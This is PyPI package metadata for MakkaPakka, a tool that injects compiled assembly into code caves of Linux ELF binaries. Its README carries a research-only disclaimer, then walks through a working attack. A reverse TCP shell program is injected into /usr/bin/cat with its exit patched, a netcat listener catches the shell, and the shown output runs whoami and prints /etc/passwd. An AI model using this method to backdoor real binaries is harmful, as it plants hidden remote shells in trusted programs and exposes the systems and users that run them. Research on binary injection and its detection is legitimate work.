{
  "info": {
    "author": "",
    "author_email": "",
    "bugtrack_url": null,
    "classifiers": [],
    "description": "# Makka Pakka\nMakka pakka is a programming language which transpiles into Intel assembly.\nMakka pakka programs are specifically written to be embedded within a target\nlinux binary (ELF file). The language contains a submodule which autmatically\ninjects the compiled code into a\n[code cave](https://en.wikipedia.org/wiki/Code_cave) of the target program.\n\nTo learn more, please visit the\n[documentation page](https://lemon-bush-0f7dfc410.2.azurestaticapps.net/).\n\n## Disclaimer\nThis project was created purely for research purposes. You do not have\npermission to use this program for malicious code injection.\n\n## Installation\n__Makka Pakka only works on Linux. Trying to run it on other operating systems will not work.__\n\nMakka pakka is distributed as a package on [PyPi](pypi.org/project/MakkaPakka).\n\nTo install, use pip:\n``` bash\npip install MakkaPakka\n```\n\nYou should then have access to three commands: mkpk, mkpk-transpile, elf-caver.\n\nTest them out!\n``` bash\nmkpk --help\nUsage: mkpk [OPTIONS] MKPK_FILEPATH TARGET_BINARY\n\nOptions:\n-o, --output-file TEXT  The filepath to output the injected binary to.\n-n, --patch-entrypoint  Patches the entrypoint to point to injected code.\n-e, --patch-exit        Patches the process exit to point to the injected\n                        code.\n-v, --verbose           Logs a verbose output to stdout.\n--help                  Show this message and exit.\n```\n\n``` bash\nmkpk-transpile --help\nUsage: mkpk-transpile [OPTIONS] MKPK_FILEPATH\n\nOptions:\n-o, --output TEXT  The filepath to output the translated makka pakka code.\n--help             Show this message and exit\n```\n\n``` bash\nelf-caver --help\nUsage: elf-caver [OPTIONS]\n\nOptions:\n-a, --asm-file TEXT     The filepath of the .asm file to inject.  [required]\n-t, --target-file TEXT  The filepath of the binary to inject into.\n                        [required]\n-o, --output-file TEXT  The filepath to output the injected binary to.\n                        [required]\n-n, --patch-entrypoint  (Optional) Patches the entrypoint to point to\n                        injected code.\n-e, --patch-exit        (Optional) Patches the process exit to point to the\n                        injected code.\n--help\n```\n\n#### Development Installation\nIf you wish to contribute to Makka Pakka, then these are the instruction for downloading the source and setting up the dev environment\n\nPrerequisite installs:\n- Python 3.10+\n- Netwide Assembler (NASM)\n\nClone the git repository and configure the environment.\n``` bash\ncd <your directory>\ngit clone https://github.com/PandasAreBears/MakkaPakka\n```\n``` bash\ncd MakkaPakka\nsource configure.sh\n```\n\nAt this point you can use Makka Pakka from within this directory.\n``` bash\npython3 mkpk.py --help\n```\n\n## Example\nCreating a Makka Pakka program file:\n```\n!link stdlib/network.mkpk\n!link stdlib/syscall.mkpk\n!link stdlib/execve.mkpk\n\n[[data]]\nexit_msg: \"Connection Terminated\"\n# 5555 in little endian.\nport: 0xb315\n# 127.0.0.1 in little endian.\naddr: 0x0100007f\n\n[[code]]\n[main]\n> socket\n> connect \"addr\" \"port\"\n> dup2\n> bin_sh\n> sys_write \"exit_msg\" 22\n> sys_exit\n```\n\nCompiling the Makka Pakka program into /usr/bin/echo:\n```\nmkpk reverse_tcp.mkpk /usr/bin/cat -e -o cat_inject\nInjecting assembly from cat_inject.asm into cat_inject.\nInjected file output to cat_inject.mkpk reverse_tcp.mkpk\n```\n\nSetting up a listener on localhost:5555:\n```\nnc -l localhost 5555\n```\n\nThen run the injected cat binary:\n```\n./cat_inject --help\nUsage: ./cat_inject [OPTION]... [FILE]...\nConcatenate FILE(s) to standard output.\n\nWith no FILE, or when FILE is -, read standard input.\n\n  -A, --show-all           equivalent to -vET\n  -b, --number-nonblank    number nonempty output lines, overrides -n\n  -e                       equivalent to -vE\n  -E, --show-ends          display $ at end of each line\n  -n, --number             number all output lines\n  -s, --squeeze-blank      suppress repeated empty output lines\n  -t                       equivalent to -vT\n  -T, --show-tabs          display TAB characters as ^I\n  -u                       (ignored)\n  -v, --show-nonprinting   use ^ and M- notation, except for LFD and TAB\n      --help     display this help and exit\n      --version  output version information and exit\n\nExamples:\n  ./cat_inject f - g  Output f's contents, then standard input, then g's contents.\n  ./cat_inject        Copy standard input to standard output.\n\nGNU coreutils online help: <https://www.gnu.org/software/coreutils/>\nReport any translation bugs to <https://translationproject.org/team/>\nFull documentation <https://www.gnu.org/software/coreutils/cat>\nor available locally via: info '(coreutils) cat invocation'\n```\n\nNow the netcat listener has a remote TCP shell:\n```\nnc -l localhost 5555\nwhoami\nalex\ncat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:102:105::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsyslog:x:104:111::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\nuuidd:x:106:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:107:113::/nonexistent:/usr/sbin/nologin\nalex:x:1000:1000:,,,:/home/alex:/bin/bash\n```\n\nFor more examples, or a more detailed technical explaination, please check\nout the\n[documentation page](https://lemon-bush-0f7dfc410.2.azurestaticapps.net/).\n",
    "description_content_type": "text/markdown",
    "docs_url": null,
    "download_url": "",
    "downloads": {
      "last_day": -1,
      "last_month": -1,
      "last_week": -1
    },
    "home_page": "",
    "keywords": "",
    "license": "",
    "maintainer": "",
    "maintainer_email": "",
    "name": "MakkaPakka",
    "package_url": "https://pypi.org/project/MakkaPakka/",
    "platform": null,
    "project_url": "https://pypi.org/project/MakkaPakka/",
    "project_urls": {
      "Documentation": "https://lemon-bush-0f7dfc410.2.azurestaticapps.net/",
      "Homepage": "https://github.com/PandasAreBears/MakkaPakka"
    },
    "release_url": "https://pypi.org/project/MakkaPakka/1.0.2/",
    "requires_dist": [
      "lief",
      "pytest",
      "pytest-cov",
      "black",
      "pre-commit",
      "click",
      "sphinx",
      "termcolor"
    ],
    "requires_python": ">=3.10",
    "summary": "A programming language for injecting code into ELF files.",
    "version": "1.0.2",
    "yanked": false,
    "yanked_reason": null
  },
  "last_serial": 17223166,
  "urls": [
    {
      "comment_text": "",
      "digests": {
        "blake2b_256": "edf3c2518ff9967f61daa91b10f37e1885da063e9ec10fb0a015eeecf9c0f193",
        "md5": "549abffc73fff87314651e75ea011db4",
        "sha256": "25f1a29fcc3e0c289203b8dc7aac3e947e573800a240c35ec2a496a18e08261e"
      },
      "downloads": -1,
      "filename": "MakkaPakka-1.0.2-py3-none-any.whl",
      "has_sig": false,
      "md5_digest": "549abffc73fff87314651e75ea011db4",
      "packagetype": "bdist_wheel",
      "python_version": "py3",
      "requires_python": ">=3.10",
      "size": 56464,
      "upload_time": "2023-02-22T10:51:34",
      "upload_time_iso_8601": "2023-02-22T10:51:34.677671Z",
      "url": "https://files.pythonhosted.org/packages/ed/f3/c2518ff9967f61daa91b10f37e1885da063e9ec10fb0a015eeecf9c0f193/MakkaPakka-1.0.2-py3-none-any.whl",
      "yanked": false,
      "yanked_reason": null
    },
    {
      "comment_text": "",
      "digests": {
        "blake2b_256": "b0d914d4f435bffe3d4bce068314df2d796cca598120171211b66858f741b4b1",
        "md5": "0838a3bea461d525f662a2b6f9f08c61",
        "sha256": "c1da92bb919d4c68afe4aa88103d45debe34eedf255402179164672d157ae79a"
      },
      "downloads": -1,
      "filename": "MakkaPakka-1.0.2.tar.gz",
      "has_sig": false,
      "md5_digest": "0838a3bea461d525f662a2b6f9f08c61",
      "packagetype": "sdist",
      "python_version": "source",
      "requires_python": ">=3.10",
      "size": 61175,
      "upload_time": "2023-02-22T10:51:37",
      "upload_time_iso_8601": "2023-02-22T10:51:37.123695Z",
      "url": "https://files.pythonhosted.org/packages/b0/d9/14d4f435bffe3d4bce068314df2d796cca598120171211b66858f741b4b1/MakkaPakka-1.0.2.tar.gz",
      "yanked": false,
      "yanked_reason": null
    }
  ],
  "vulnerabilities": []
}